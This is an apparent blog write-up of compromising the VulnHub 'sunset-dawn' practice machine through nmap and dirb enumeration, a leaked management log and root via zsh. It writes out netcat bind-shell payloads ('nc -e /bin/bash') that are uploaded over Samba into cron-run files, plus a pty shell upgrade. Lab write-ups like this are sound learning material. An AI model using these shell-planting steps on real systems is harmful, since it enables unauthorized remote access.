This is a machine from [Vuln Hub!](https://www.vulnhub.com/entry/sunset-dawn,341/) It was labeled as an easy machine, but figured I'd still learn a few things!

I start out with a basic nmap scan as usual `nmap -sV -sS dawn`

![nmap]({{ site.baseurl }}/images/dawn/nmap.png)

Right away this tells us it has port 80 open, has a SQL database, and a Samba Share. Now the SQL database should not be an open port and I would be extremely surprised if that wasn't a path towards root.

I decided to go the port 80 route.

This isn't really giving me much, so I decided to run a dirbuster on the port.

`dirb 192.168.1.165` 
It's worth noting that additional options can be applied to this command. It just wasn't necessary in this case.

conveniently this tells me there is a log page located at http://dawn/logs

![Logs]({{ site.baseurl }}/images/dawn/logs.png)

All but one of these links were non-accessible. `Management.log` was the only one available to us, so we took a look at it. At first glance it shows us there is cron jobs running, and files that have executable rights by everyone.

After a few failed attempts at getting a working shell, I decide to look back at the management log. Since this is considered an easy machine the command to execute the shell was already there...

I started a netcat on the port in the log `nc 192.168.1.165 1024`

![Shell]({{ site.baseurl }}/images/dawn/usershell.png)

Great! But if we needed to upload our own shell we could have done:


	echo "nc -e /bin/bash -lvp 1024 &" >> product-control
	echo "nc -e /bin/bash -lvp 1025 &" >> web-control


	
Inside of the Samba share type: `put web-control` and `put product-control` to upload the shells. Then make sure to verify they are being executed by downloading a new version of the Management.log.

A quick google search will give you this command to spawn a more complete shell: `python -c 'import pty; pty.spawn("/bin/bash")'`. Once we have this shell I decided to start looking around. After realizing there was no user flag the next step was privilege escelation.

I typed `History` into the shell with this output:

![History Output]({{ site.baseurl }}/images/dawn/bash_history.png)

`zsh` was the only command that looked interesting. A bit of research shows it is a different shell that can be installed. 

I decide to run the command to see what happens. This is the result:

![root]({{ base.url }}/images/dawn/root.png)

All in all, I was extremely surprised that this gave me root. Privilege escelation is what I'm struggling with most right now. There are a lot of writeups online on this box, but for the sake of learning I decided to avoid them in my google searches.
